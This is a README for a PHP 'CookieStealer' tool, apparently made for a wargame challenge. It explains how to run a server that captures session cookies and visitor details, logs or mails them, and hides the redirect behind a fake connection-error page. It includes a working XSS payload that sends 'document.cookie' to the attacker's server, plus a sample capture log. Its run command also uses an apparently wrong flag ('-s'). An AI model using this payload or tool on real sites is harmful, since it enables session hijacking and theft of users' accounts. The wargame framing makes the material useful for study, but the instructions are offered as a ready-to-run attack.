# CookieStealer
## Information
A simple Cookie Stealer written in PHP created to solve a wargame-challenge. When a user is redirected to the server running the cookie stealer its current session cookie is saved to a logfile or mailed together with basic information about the redirected user. The PHP-program also contains an example of how detection of the website redirection can be avoided by using a simple bogus webpage suing the iamge "connectionError.png". Further explanation of how the php-program works can be seen as comments in "index.php".

## Requirements
The only requirement of this program is PHP. Can be installed using:
```bash
sudo apt-get install php
```

## Run
The simplest way to run a server containing the Cookie Grabber is by running:
```bash
php -s <IP><Port> -t <Path>
```
Where <Path> is the path of the "CookieStealer" directory.
  
## Example
A server is started using the command:
```bash
php -s 127.0.0.1:1337 -t .
```
A user visits a webpage with XSS vulnerabilites. A user is redirected to the server running the Cookie Stealer using the injected javascript:
```bash
<script>document.location="http://127.0.0.1:1337/?cookie=" + document.cookie;</script>
```
The resulting log of the redirection is seen below.
```bash
IP: 
Port: 39024
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Method: 
Referer: 
Date: 2018-11-23 07:27:38
Cookie: <Omitted Output>
```


